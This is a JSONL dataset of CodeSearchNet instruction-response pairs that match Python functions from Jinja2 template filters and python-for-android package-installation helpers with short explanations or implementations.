{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nenforce HTML escaping. This will probably double escape variables.", "response": "def do_forceescape(value):\n    \"\"\"Enforce HTML escaping.  This will probably double escape variables.\"\"\"\n    if hasattr(value, '__html__'):\n        value = value.__html__()\n    return escape(unicode(value))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef do_replace(eval_ctx, s, old, new, count=None):\n    if count is None:\n        count = -1\n    if not eval_ctx.autoescape:\n        return unicode(s).replace(unicode(old), unicode(new), count)\n    if hasattr(old, '__html__') or hasattr(new, '__html__') and \\\n       not hasattr(s, '__html__'):\n        s = escape(s)\n    else:\n        s = soft_unicode(s)\n    return s.replace(soft_unicode(old), soft_unicode(new), count)", "response": "Return a copy of the value with all occurrences of a substring\n    replaced with a new one."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef do_xmlattr(_eval_ctx, d, autospace=True):\n    rv = u' '.join(\n        u'%s=\"%s\"' % (escape(key), escape(value))\n        for key, value in d.iteritems()\n        if value is not None and not isinstance(value, Undefined)\n    )\n    if autospace and rv:\n        rv = u' ' + rv\n    if _eval_ctx.autoescape:\n        rv = Markup(rv)\n    return rv", "response": "Create an SGML or XML attribute string based on the items in a dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef do_sort(value, case_sensitive=False):\n    if not case_sensitive:\n        def sort_func(item):\n            if isinstance(item, basestring):\n                item = item.lower()\n            return item\n    else:\n        sort_func = None\n    return sorted(seq, key=sort_func)", "response": "Sort an iterable.  If the iterable is made of strings the second\n    parameter can be used to control the case sensitiveness of the\n    comparison which is disabled by default.\n\n    .. sourcecode:: jinja\n\n        {% for item in iterable|sort %}\n            ...\n        {% endfor %}"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ndefault function for the base class", "response": "def do_default(value, default_value=u'', boolean=False):\n    \"\"\"If the value is undefined it will return the passed default value,\n    otherwise the value of the variable:\n\n    .. sourcecode:: jinja\n\n        {{ my_variable|default('my_variable is not defined') }}\n\n    This will output the value of ``my_variable`` if the variable was\n    defined, otherwise ``'my_variable is not defined'``. If you want\n    to use default with variables that evaluate to false you have to\n    set the second parameter to `true`:\n\n    .. sourcecode:: jinja\n\n        {{ ''|default('the string was empty', true) }}\n    \"\"\"\n    if (boolean and not value) or isinstance(value, Undefined):\n        return default_value\n    return value"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef do_join(eval_ctx, value, d=u''):\n    # no automatic escaping?  joining is a lot eaiser then\n    if not eval_ctx.autoescape:\n        return unicode(d).join(imap(unicode, value))\n\n    # if the delimiter doesn't have an html representation we check\n    # if any of the items has.  If yes we do a coercion to Markup\n    if not hasattr(d, '__html__'):\n        value = list(value)\n        do_escape = False\n        for idx, item in enumerate(value):\n            if hasattr(item, '__html__'):\n                do_escape = True\n            else:\n                value[idx] = unicode(item)\n        if do_escape:\n            d = escape(d)\n        else:\n            d = unicode(d)\n        return d.join(value)\n\n    # no html involved, to normal joining\n    return soft_unicode(d).join(imap(soft_unicode, value))", "response": "Returns a string which is the concatenation of the strings in the\n    sequence."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nformatting the value like a human - readable file size.", "response": "def do_filesizeformat(value, binary=False):\n    \"\"\"Format the value like a 'human-readable' file size (i.e. 13 KB,\n    4.1 MB, 102 bytes, etc).  Per default decimal prefixes are used (mega,\n    giga, etc.), if the second parameter is set to `True` the binary\n    prefixes are used (mebi, gibi).\n    \"\"\"\n    bytes = float(value)\n    base = binary and 1024 or 1000\n    middle = binary and 'i' or ''\n    if bytes < base:\n        return \"%d Byte%s\" % (bytes, bytes != 1 and 's' or '')\n    elif bytes < base * base:\n        return \"%.1f K%sB\" % (bytes / base, middle)\n    elif bytes < base * base * base:\n        return \"%.1f M%sB\" % (bytes / (base * base), middle)\n    return \"%.1f G%sB\" % (bytes / (base * base * base), middle)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts URLs in plain text into clickable links.", "response": "def do_urlize(eval_ctx, value, trim_url_limit=None, nofollow=False):\n    \"\"\"Converts URLs in plain text into clickable links.\n\n    If you pass the filter an additional integer it will shorten the urls\n    to that number. Also a third argument exists that makes the urls\n    \"nofollow\":\n\n    .. sourcecode:: jinja\n\n        {{ mytext|urlize(40, true) }}\n            links are shortened to 40 chars and defined with rel=\"nofollow\"\n    \"\"\"\n    rv = urlize(value, trim_url_limit, nofollow)\n    if eval_ctx.autoescape:\n        rv = Markup(rv)\n    return rv"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef do_indent(s, width=4, indentfirst=False):\n    indention = u' ' * width\n    rv = (u'\\n' + indention).join(s.splitlines())\n    if indentfirst:\n        rv = indention + rv\n    return rv", "response": "Return a copy of the passed string indented by width spaces."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn a truncated copy of the string.", "response": "def do_truncate(s, length=255, killwords=False, end='...'):\n    \"\"\"Return a truncated copy of the string. The length is specified\n    with the first parameter which defaults to ``255``. If the second\n    parameter is ``true`` the filter will cut the text at length. Otherwise\n    it will try to save the last word. If the text was in fact\n    truncated it will append an ellipsis sign (``\"...\"``). If you want a\n    different ellipsis sign than ``\"...\"`` you can specify it using the\n    third parameter.\n\n    .. sourcecode jinja::\n\n        {{ mytext|truncate(300, false, '&raquo;') }}\n            truncate mytext to 300 chars, don't split up words, use a\n            right pointing double arrow as ellipsis sign.\n    \"\"\"\n    if len(s) <= length:\n        return s\n    elif killwords:\n        return s[:length] + end\n    words = s.split(' ')\n    result = []\n    m = 0\n    for word in words:\n        m += len(word) + 1\n        if m > length:\n            break\n        result.append(word)\n    result.append(end)\n    return u' '.join(result)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef do_wordwrap(s, width=79, break_long_words=True):\n    import textwrap\n    return u'\\n'.join(textwrap.wrap(s, width=width, expand_tabs=False,\n                                   replace_whitespace=False,\n                                   break_long_words=break_long_words))", "response": "Returns a copy of the string passed to the filter wrapped after\n    characters."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconverts the value into an integer.", "response": "def do_int(value, default=0):\n    \"\"\"Convert the value into an integer. If the\n    conversion doesn't work it will return ``0``. You can\n    override this default using the first parameter.\n    \"\"\"\n    try:\n        return int(value)\n    except (TypeError, ValueError):\n        # this quirk is necessary so that \"42.23\"|int gives 42.\n        try:\n            return int(float(value))\n        except (TypeError, ValueError):\n            return default"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef do_striptags(value):\n    if hasattr(value, '__html__'):\n        value = value.__html__()\n    return Markup(unicode(value)).striptags()", "response": "Strip SGML and XML tags and replace adjacent whitespace by one space."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef do_groupby(environment, value, attribute):\n    expr = lambda x: environment.getitem(x, attribute)\n    return sorted(map(_GroupTuple, groupby(sorted(value, key=expr), expr)))", "response": "Group a sequence of objects by a common attribute."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nextracting metdata files from the given package to the given folder.", "response": "def extract_metainfo_files_from_package(\n        package,\n        output_folder,\n        debug=False\n        ):\n    \"\"\" Extracts metdata files from the given package to the given folder,\n        which may be referenced in any way that is permitted in\n        a requirements.txt file or install_requires=[] listing.\n\n        Current supported metadata files that will be extracted:\n\n        - pytoml.yml  (only if package wasn't obtained as wheel)\n        - METADATA\n    \"\"\"\n\n    if package is None:\n        raise ValueError(\"package cannot be None\")\n\n    if not os.path.exists(output_folder) or os.path.isfile(output_folder):\n        raise ValueError(\"output folder needs to be existing folder\")\n\n    # A temp folder for making a package copy in case it's a local folder,\n    # because extracting metadata might modify files\n    # (creating sdists/wheels...)\n    temp_folder = tempfile.mkdtemp(prefix=\"pythonpackage-package-copy-\")\n    try:\n        # Package is indeed a folder! Get a temp copy to work on:\n        if is_filesystem_path(package):\n            shutil.copytree(\n                parse_as_folder_reference(package),\n                os.path.join(temp_folder, \"package\")\n            )\n            package = os.path.join(temp_folder, \"package\")\n\n        # Because PEP517 can be noisy and contextlib.redirect_* fails to\n        # contain it, we will run the actual analysis in a separate process:\n        try:\n            subprocess.check_output([\n                sys.executable,\n                \"-c\",\n                \"import importlib\\n\"\n                \"import json\\n\"\n                \"import os\\n\"\n                \"import sys\\n\"\n                \"sys.path = [os.path.dirname(sys.argv[3])] + sys.path\\n\"\n                \"m = importlib.import_module(\\n\"\n                \"    os.path.basename(sys.argv[3]).partition('.')[0]\\n\"\n                \")\\n\"\n                \"m._extract_metainfo_files_from_package_unsafe(\"\n                \"    sys.argv[1],\"\n                \"    sys.argv[2],\"\n                \")\",\n                package, output_folder, os.path.abspath(__file__)],\n                stderr=subprocess.STDOUT,  # make sure stderr is muted.\n                cwd=os.path.join(os.path.dirname(__file__), \"..\")\n            )\n        except subprocess.CalledProcessError as e:\n            output = e.output.decode(\"utf-8\", \"replace\")\n            if debug:\n                print(\"Got error obtaining meta info.\")\n                print(\"Detail output:\")\n                print(output)\n                print(\"End of Detail output.\")\n            raise ValueError(\n                \"failed to obtain meta info - \"\n                \"is '{}' a valid package? \"\n                \"Detailed output:\\n{}\".format(package, output)\n                )\n    finally:\n        shutil.rmtree(temp_folder)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _get_system_python_executable():\n    # This function is required by get_package_as_folder() to work\n    # inside a virtualenv, since venv creation will fail with\n    # the virtualenv's local python binary.\n    # (venv/virtualenv incompatibility)\n\n    # Abort if not in virtualenv or venv:\n    if not hasattr(sys, \"real_prefix\") and (\n            not hasattr(sys, \"base_prefix\") or\n            os.path.normpath(sys.base_prefix) ==\n            os.path.normpath(sys.prefix)):\n        return sys.executable\n\n    # Extract prefix we need to look in:\n    if hasattr(sys, \"real_prefix\"):\n        search_prefix = sys.real_prefix  # virtualenv\n    else:\n        search_prefix = sys.base_prefix  # venv\n\n    def python_binary_from_folder(path):\n        def binary_is_usable(python_bin):\n            try:\n                filenotfounderror = FileNotFoundError\n            except NameError:  # Python 2\n                filenotfounderror = OSError\n            try:\n                subprocess.check_output([\n                    os.path.join(path, python_bin), \"--version\"\n                ], stderr=subprocess.STDOUT)\n                return True\n            except (subprocess.CalledProcessError, filenotfounderror):\n                return False\n\n        python_name = \"python\" + sys.version\n        while (not binary_is_usable(python_name) and\n               python_name.find(\".\") > 0):\n            # Try less specific binary name:\n            python_name = python_name.rpartition(\".\")[0]\n        if binary_is_usable(python_name):\n            return os.path.join(path, python_name)\n        return None\n\n    # Return from sys.real_prefix if present:\n    result = python_binary_from_folder(search_prefix)\n    if result is not None:\n        return result\n\n    # Check out all paths in $PATH:\n    bad_candidates = []\n    good_candidates = []\n    ever_had_nonvenv_path = False\n    for p in os.environ.get(\"PATH\", \"\").split(\":\"):\n        # Skip if not possibly the real system python:\n        if not os.path.normpath(p).startswith(\n                os.path.normpath(search_prefix)\n                ):\n            continue\n\n        # First folders might be virtualenv/venv we want to avoid:\n        if not ever_had_nonvenv_path:\n            sep = os.path.sep\n            if (\"system32\" not in p.lower() and \"usr\" not in p) or \\\n                    {\"home\", \".tox\"}.intersection(set(p.split(sep))) or \\\n                    \"users\" in p.lower():\n                # Doesn't look like bog-standard system path.\n                if (p.endswith(os.path.sep + \"bin\") or\n                        p.endswith(os.path.sep + \"bin\" + os.path.sep)):\n                    # Also ends in \"bin\" -> likely virtualenv/venv.\n                    # Add as unfavorable / end of candidates:\n                    bad_candidates.append(p)\n                    continue\n            ever_had_nonvenv_path = True\n\n        good_candidates.append(p)\n\n    # See if we can now actually find the system python:\n    for p in good_candidates + bad_candidates:\n        result = python_binary_from_folder(p)\n        if result is not None:\n            return result\n\n    raise RuntimeError(\"failed to locate system python in: \" +\n                       sys.real_prefix)", "response": "Returns the path to the system - wide python executable."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_package_as_folder(dependency):\n\n    venv_parent = tempfile.mkdtemp(\n        prefix=\"pythonpackage-venv-\"\n    )\n    try:\n        # Create a venv to install into:\n        try:\n            if int(sys.version.partition(\".\")[0]) < 3:\n                # Python 2.x has no venv.\n                subprocess.check_output([\n                    sys.executable,  # no venv conflict possible,\n                                     # -> no need to use system python\n                    \"-m\", \"virtualenv\",\n                    \"--python=\" + _get_system_python_executable(),\n                    os.path.join(venv_parent, 'venv')\n                ], cwd=venv_parent)\n            else:\n                # On modern Python 3, use venv.\n                subprocess.check_output([\n                    _get_system_python_executable(), \"-m\", \"venv\",\n                    os.path.join(venv_parent, 'venv')\n                ], cwd=venv_parent)\n        except subprocess.CalledProcessError as e:\n            output = e.output.decode('utf-8', 'replace')\n            raise ValueError(\n                'venv creation unexpectedly ' +\n                'failed. error output: ' + str(output)\n            )\n        venv_path = os.path.join(venv_parent, \"venv\")\n\n        # Update pip and wheel in venv for latest feature support:\n        try:\n            filenotfounderror = FileNotFoundError\n        except NameError:  # Python 2.\n            filenotfounderror = OSError\n        try:\n            subprocess.check_output([\n                os.path.join(venv_path, \"bin\", \"pip\"),\n                \"install\", \"-U\", \"pip\", \"wheel\",\n            ])\n        except filenotfounderror:\n            raise RuntimeError(\n                \"venv appears to be missing pip. \"\n                \"did we fail to use a proper system python??\\n\"\n                \"system python path detected: {}\\n\"\n                \"os.environ['PATH']: {}\".format(\n                    _get_system_python_executable(),\n                    os.environ.get(\"PATH\", \"\")\n                )\n            )\n\n        # Create download subfolder:\n        os.mkdir(os.path.join(venv_path, \"download\"))\n\n        # Write a requirements.txt with our package and download:\n        with open(os.path.join(venv_path, \"requirements.txt\"),\n                  \"w\", encoding=\"utf-8\"\n                 ) as f:\n            def to_unicode(s):  # Needed for Python 2.\n                try:\n                    return s.decode(\"utf-8\")\n                except AttributeError:\n                    return s\n            f.write(to_unicode(transform_dep_for_pip(dependency)))\n        try:\n            subprocess.check_output(\n                [\n                    os.path.join(venv_path, \"bin\", \"pip\"),\n                    \"download\", \"--no-deps\", \"-r\", \"../requirements.txt\",\n                    \"-d\", os.path.join(venv_path, \"download\")\n                ],\n                stderr=subprocess.STDOUT,\n                cwd=os.path.join(venv_path, \"download\")\n            )\n        except subprocess.CalledProcessError as e:\n            raise RuntimeError(\"package download failed: \" + str(e.output))\n\n        if len(os.listdir(os.path.join(venv_path, \"download\"))) == 0:\n            # No download. This can happen if the dependency has a condition\n            # which prohibits install in our environment.\n            # (the \"package ; ... conditional ... \" type of condition)\n            return (None, None)\n\n        # Get the result and make sure it's an extracted directory:\n        result_folder_or_file = os.path.join(\n            venv_path, \"download\",\n            os.listdir(os.path.join(venv_path, \"download\"))[0]\n        )\n        dl_type = \"source\"\n        if not os.path.isdir(result_folder_or_file):\n            # Must be an archive.\n            if result_folder_or_file.endswith((\".zip\", \".whl\")):\n                if result_folder_or_file.endswith(\".whl\"):\n                    dl_type = \"wheel\"\n                with zipfile.ZipFile(result_folder_or_file) as f:\n                    f.extractall(os.path.join(venv_path,\n                                              \"download\", \"extracted\"\n                                             ))\n                    result_folder_or_file = os.path.join(\n                        venv_path, \"download\", \"extracted\"\n                    )\n            elif result_folder_or_file.find(\".tar.\") > 0:\n                # Probably a tarball.\n                with tarfile.open(result_folder_or_file) as f:\n                    f.extractall(os.path.join(venv_path,\n                                              \"download\", \"extracted\"\n                                             ))\n                    result_folder_or_file = os.path.join(\n                        venv_path, \"download\", \"extracted\"\n                    )\n            else:\n                raise RuntimeError(\n                    \"unknown archive or download \" +\n                    \"type: \" + str(result_folder_or_file)\n                )\n\n        # If the result is hidden away in an additional subfolder,\n        # descend into it:\n        while os.path.isdir(result_folder_or_file) and \\\n                len(os.listdir(result_folder_or_file)) == 1 and \\\n                os.path.isdir(os.path.join(\n                    result_folder_or_file,\n                    os.listdir(result_folder_or_file)[0]\n                )):\n            result_folder_or_file = os.path.join(\n                result_folder_or_file,\n                os.listdir(result_folder_or_file)[0]\n            )\n\n        # Copy result to new dedicated folder so we can throw away\n        # our entire virtualenv nonsense after returning:\n        result_path = tempfile.mkdtemp()\n        shutil.rmtree(result_path)\n        shutil.copytree(result_folder_or_file, result_path)\n        return (dl_type, result_path)\n    finally:\n        shutil.rmtree(venv_parent)", "response": "This function downloads the given package and extracts the raw contents into a folder."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nparse a dependency reference into a folder path.", "response": "def parse_as_folder_reference(dep):\n    \"\"\" See if a dependency reference refers to a folder path.\n        If it does, return the folder path (which parses and\n        resolves file:// urls in the process).\n        If it doesn't, return None.\n    \"\"\"\n    # Special case: pep508 urls\n    if dep.find(\"@\") > 0 and (\n            (dep.find(\"@\") < dep.find(\"/\") or \"/\" not in dep) and\n            (dep.find(\"@\") < dep.find(\":\") or \":\" not in dep)\n            ):\n        # This should be a 'pkgname @ https://...' style path, or\n        # 'pkname @ /local/file/path'.\n        return parse_as_folder_reference(dep.partition(\"@\")[2].lstrip())\n\n    # Check if this is either not an url, or a file URL:\n    if dep.startswith((\"/\", \"file://\")) or (\n            dep.find(\"/\") > 0 and\n            dep.find(\"://\") < 0):\n        if dep.startswith(\"file://\"):\n            dep = urlunquote(urlparse(dep).path)\n        return dep\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _extract_info_from_package(dependency,\n                               extract_type=None,\n                               debug=False,\n                               include_build_requirements=False\n                               ):\n    \"\"\" Internal function to extract metainfo from a package.\n        Currently supported info types:\n\n        - name\n        - dependencies  (a list of dependencies)\n    \"\"\"\n    output_folder = tempfile.mkdtemp(prefix=\"pythonpackage-metafolder-\")\n    try:\n        extract_metainfo_files_from_package(\n            dependency, output_folder, debug=debug\n        )\n\n        with open(os.path.join(output_folder, \"METADATA\"),\n                  \"r\", encoding=\"utf-8\"\n                 ) as f:\n            # Get metadata and cut away description (is after 2 linebreaks)\n            metadata_entries = f.read().partition(\"\\n\\n\")[0].splitlines()\n\n        if extract_type == \"name\":\n            name = None\n            for meta_entry in metadata_entries:\n                if meta_entry.lower().startswith(\"name:\"):\n                    return meta_entry.partition(\":\")[2].strip()\n            if name is None:\n                raise ValueError(\"failed to obtain package name\")\n            return name\n        elif extract_type == \"dependencies\":\n            requirements = []\n            if os.path.exists(os.path.join(output_folder,\n                                           'pyproject.toml')\n                              ) and include_build_requirements:\n                with open(os.path.join(output_folder, 'pyproject.toml')) as f:\n                    build_sys = pytoml.load(f)['build-system']\n                    if \"requires\" in build_sys:\n                        requirements += build_sys[\"requires\"]\n\n            # Add requirements from metadata:\n            requirements += [\n                entry.rpartition(\"Requires-Dist:\")[2].strip()\n                for entry in metadata_entries\n                if entry.startswith(\"Requires-Dist\")\n            ]\n\n            return list(set(requirements))  # remove duplicates\n    finally:\n        shutil.rmtree(output_folder)", "response": "Internal function to extract metainfo from a package."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ngetting the dependencies of a package.", "response": "def get_package_dependencies(package,\n                             recursive=False,\n                             verbose=False,\n                             include_build_requirements=False):\n    \"\"\" Obtain the dependencies from a package. Please note this\n        function is possibly SLOW, especially if you enable\n        the recursive mode.\n    \"\"\"\n    packages_processed = set()\n    package_queue = [package]\n    reqs = set()\n    reqs_as_names = set()\n    while len(package_queue) > 0:\n        current_queue = package_queue\n        package_queue = []\n        for package_dep in current_queue:\n            new_reqs = set()\n            if verbose:\n                print(\"get_package_dependencies: resolving dependecy \"\n                      \"to package name: \".format(package_dep))\n            package = get_package_name(package_dep)\n            if package.lower() in packages_processed:\n                continue\n            if verbose:\n                print(\"get_package_dependencies: \"\n                      \"processing package: {}\".format(package))\n                print(\"get_package_dependencies: \"\n                      \"Packages seen so far: {}\".format(\n                          packages_processed\n                      ))\n            packages_processed.add(package.lower())\n\n            # Use our regular folder processing to examine:\n            new_reqs = new_reqs.union(_extract_info_from_package(\n                package_dep, extract_type=\"dependencies\",\n                debug=verbose,\n                include_build_requirements=include_build_requirements,\n            ))\n\n            # Process new requirements:\n            if verbose:\n                print('get_package_dependencies: collected '\n                      \"deps of '{}': {}\".format(\n                          package_dep, str(new_reqs),\n                      ))\n            for new_req in new_reqs:\n                try:\n                    req_name = get_package_name(new_req)\n                except ValueError as e:\n                    if new_req.find(\";\") >= 0:\n                        # Conditional dep where condition isn't met?\n                        # --> ignore it\n                        continue\n                    if verbose:\n                        print(\"get_package_dependencies: \" +\n                              \"unexpected failure to get name \" +\n                              \"of '\" + str(new_req) + \"': \" +\n                              str(e))\n                    raise RuntimeError(\n                        \"failed to get \" +\n                        \"name of dependency: \" + str(e)\n                    )\n                if req_name.lower() in reqs_as_names:\n                    continue\n                if req_name.lower() not in packages_processed:\n                    package_queue.append(new_req)\n                reqs.add(new_req)\n                reqs_as_names.add(req_name.lower())\n\n            # Bail out here if we're not scanning recursively:\n            if not recursive:\n                package_queue[:] = []  # wipe queue\n                break\n    if verbose:\n        print(\"get_package_dependencies: returning result: {}\".format(reqs))\n    return reqs"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the dependency names of a package in the given folder.", "response": "def get_dep_names_of_package(\n        package,\n        keep_version_pins=False,\n        recursive=False,\n        verbose=False,\n        include_build_requirements=False\n        ):\n    \"\"\" Gets the dependencies from the package in the given folder,\n        then attempts to deduce the actual package name resulting\n        from each dependency line, stripping away everything else.\n    \"\"\"\n\n    # First, obtain the dependencies:\n    dependencies = get_package_dependencies(\n        package, recursive=recursive, verbose=verbose,\n        include_build_requirements=include_build_requirements,\n    )\n    if verbose:\n        print(\"get_dep_names_of_package_folder: \" +\n              \"processing dependency list to names: \" +\n              str(dependencies))\n\n    # Transform dependencies to their stripped down names:\n    # (they can still have version pins/restrictions, conditionals, ...)\n    dependency_names = set()\n    for dep in dependencies:\n        # If we are supposed to keep exact version pins, extract first:\n        pin_to_append = \"\"\n        if keep_version_pins and \"(==\" in dep and dep.endswith(\")\"):\n            # This is a dependency of the format: 'pkg (==1.0)'\n            pin_to_append = \"==\" + dep.rpartition(\"==\")[2][:-1]\n        elif keep_version_pins and \"==\" in dep and not dep.endswith(\")\"):\n            # This is a dependency of the format: 'pkg==1.0'\n            pin_to_append = \"==\" + dep.rpartition(\"==\")[2]\n        # Now get true (and e.g. case-corrected) dependency name:\n        dep_name = get_package_name(dep) + pin_to_append\n        dependency_names.add(dep_name)\n    return dependency_names"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef run_pymodules_install(ctx, modules, project_dir, ignore_setup_py=False):\n\n    info('*** PYTHON PACKAGE / PROJECT INSTALL STAGE ***')\n    modules = list(filter(ctx.not_has_package, modules))\n\n    # Bail out if no python deps and no setup.py to process:\n    if not modules and (\n            ignore_setup_py or\n            not project_has_setup_py(project_dir)\n            ):\n        info('No Python modules and no setup.py to process, skipping')\n        return\n\n    # Output messages about what we're going to do:\n    if modules:\n        info('The requirements ({}) don\\'t have recipes, attempting to '\n             'install them with pip'.format(', '.join(modules)))\n        info('If this fails, it may mean that the module has compiled '\n             'components and needs a recipe.')\n    if project_has_setup_py(project_dir) and not ignore_setup_py:\n        info('Will process project install, if it fails then the '\n             'project may not be compatible for Android install.')\n\n    venv = sh.Command(ctx.virtualenv)\n    with current_directory(join(ctx.build_dir)):\n        shprint(venv,\n                '--python=python{}'.format(\n                    ctx.python_recipe.major_minor_version_string.\n                    partition(\".\")[0]\n                    ),\n                'venv'\n               )\n\n        # Prepare base environment and upgrade pip:\n        base_env = copy.copy(os.environ)\n        base_env[\"PYTHONPATH\"] = ctx.get_site_packages_dir()\n        info('Upgrade pip to latest version')\n        shprint(sh.bash, '-c', (\n            \"source venv/bin/activate && pip install -U pip\"\n        ), _env=copy.copy(base_env))\n\n        # Install Cython in case modules need it to build:\n        info('Install Cython in case one of the modules needs it to build')\n        shprint(sh.bash, '-c', (\n            \"venv/bin/pip install Cython\"\n        ), _env=copy.copy(base_env))\n\n        # Get environment variables for build (with CC/compiler set):\n        standard_recipe = CythonRecipe()\n        standard_recipe.ctx = ctx\n        # (note: following line enables explicit -lpython... linker options)\n        standard_recipe.call_hostpython_via_targetpython = False\n        recipe_env = standard_recipe.get_recipe_env(ctx.archs[0])\n        env = copy.copy(base_env)\n        env.update(recipe_env)\n\n        # Make sure our build package dir is available, and the virtualenv\n        # site packages come FIRST (so the proper pip version is used):\n        env[\"PYTHONPATH\"] += \":\" + ctx.get_site_packages_dir()\n        env[\"PYTHONPATH\"] = os.path.abspath(join(\n            ctx.build_dir, \"venv\", \"lib\",\n            \"python\" + ctx.python_recipe.major_minor_version_string,\n            \"site-packages\")) + \":\" + env[\"PYTHONPATH\"]\n\n        # Install the manually specified requirements first:\n        if not modules:\n            info('There are no Python modules to install, skipping')\n        else:\n            info('Creating a requirements.txt file for the Python modules')\n            with open('requirements.txt', 'w') as fileh:\n                for module in modules:\n                    key = 'VERSION_' + module\n                    if key in environ:\n                        line = '{}=={}\\n'.format(module, environ[key])\n                    else:\n                        line = '{}\\n'.format(module)\n                    fileh.write(line)\n\n            info('Installing Python modules with pip')\n            info('IF THIS FAILS, THE MODULES MAY NEED A RECIPE. '\n                 'A reason for this is often modules compiling '\n                 'native code that is unaware of Android cross-compilation '\n                 'and does not work without additional '\n                 'changes / workarounds.')\n\n            shprint(sh.bash, '-c', (\n                \"venv/bin/pip \" +\n                \"install -v --target '{0}' --no-deps -r requirements.txt\"\n            ).format(ctx.get_site_packages_dir().replace(\"'\", \"'\\\"'\\\"'\")),\n                    _env=copy.copy(env))\n\n        # Afterwards, run setup.py if present:\n        if project_has_setup_py(project_dir) and not ignore_setup_py:\n            with current_directory(project_dir):\n                info('got setup.py or similar, running project install. ' +\n                     '(disable this behavior with --ignore-setup-py)')\n\n                # Compute & output the constraints we will use:\n                info('Contents that will be used for constraints.txt:')\n                constraints = subprocess.check_output([\n                    join(\n                        ctx.build_dir, \"venv\", \"bin\", \"pip\"\n                    ),\n                    \"freeze\"\n                ], env=copy.copy(env))\n                try:\n                    constraints = constraints.decode(\"utf-8\", \"replace\")\n                except AttributeError:\n                    pass\n                info(constraints)\n\n                # Make sure all packages found are fixed in version\n                # by writing a constraint file, to avoid recipes being\n                # upgraded & reinstalled:\n                with open('constraints.txt', 'wb') as fileh:\n                    fileh.write(constraints.encode(\"utf-8\", \"replace\"))\n\n                info('Populating venv\\'s site-packages with '\n                     'ctx.get_site_packages_dir()...')\n\n                # Copy dist contents into site-packages for discovery.\n                # Why this is needed:\n                # --target is somewhat evil and messes with discovery of\n                # packages in PYTHONPATH if that also includes the target\n                # folder. So we need to use the regular virtualenv\n                # site-packages folder instead.\n                # Reference:\n                # https://github.com/pypa/pip/issues/6223\n                ctx_site_packages_dir = os.path.normpath(\n                    os.path.abspath(ctx.get_site_packages_dir())\n                )\n                venv_site_packages_dir = os.path.normpath(os.path.join(\n                    ctx.build_dir, \"venv\", \"lib\", [\n                        f for f in os.listdir(os.path.join(\n                            ctx.build_dir, \"venv\", \"lib\"\n                        )) if f.startswith(\"python\")\n                    ][0], \"site-packages\"\n                ))\n                copied_over_contents = []\n                for f in os.listdir(ctx_site_packages_dir):\n                    full_path = os.path.join(ctx_site_packages_dir, f)\n                    if not os.path.exists(os.path.join(\n                                venv_site_packages_dir, f\n                            )):\n                        if os.path.isdir(full_path):\n                            shutil.copytree(full_path, os.path.join(\n                                venv_site_packages_dir, f\n                            ))\n                        else:\n                            shutil.copy2(full_path, os.path.join(\n                                venv_site_packages_dir, f\n                            ))\n                        copied_over_contents.append(f)\n\n                # Get listing of virtualenv's site-packages, to see the\n                # newly added things afterwards & copy them back into\n                # the distribution folder / build context site-packages:\n                previous_venv_contents = os.listdir(venv_site_packages_dir)\n\n                # Actually run setup.py:\n                info('Launching package install...')\n                shprint(sh.bash, '-c', (\n                    \"'\" + join(\n                        ctx.build_dir, \"venv\", \"bin\", \"pip\"\n                    ).replace(\"'\", \"'\\\"'\\\"'\") + \"' \" +\n                    \"install -c constraints.txt -v .\"\n                ).format(ctx.get_site_packages_dir().replace(\"'\", \"'\\\"'\\\"'\")),\n                        _env=copy.copy(env))\n\n                # Go over all new additions and copy them back:\n                info('Copying additions resulting from setup.py back ' +\n                     'into ctx.get_site_packages_dir()...')\n                new_venv_additions = []\n                for f in (set(os.listdir(venv_site_packages_dir)) -\n                          set(previous_venv_contents)):\n                    new_venv_additions.append(f)\n                    full_path = os.path.join(venv_site_packages_dir, f)\n                    if os.path.isdir(full_path):\n                        shutil.copytree(full_path, os.path.join(\n                            ctx_site_packages_dir, f\n                        ))\n                    else:\n                        shutil.copy2(full_path, os.path.join(\n                            ctx_site_packages_dir, f\n                        ))\n\n                # Undo all the changes we did to the venv-site packages:\n                info('Reverting additions to virtualenv\\'s site-packages...')\n                for f in set(copied_over_contents + new_venv_additions):\n                    full_path = os.path.join(venv_site_packages_dir, f)\n                    if os.path.isdir(full_path):\n                        shutil.rmtree(full_path)\n                    else:\n                        os.remove(full_path)\n        elif not ignore_setup_py:\n            info(\"No setup.py found in project directory: \" +\n                 str(project_dir)\n                )\n\n        # Strip object files after potential Cython or native code builds:\n        standard_recipe.strip_object_files(ctx.archs[0], env,\n                                           build_dir=ctx.build_dir)", "response": "This function will process all python modules and install them via pip."}
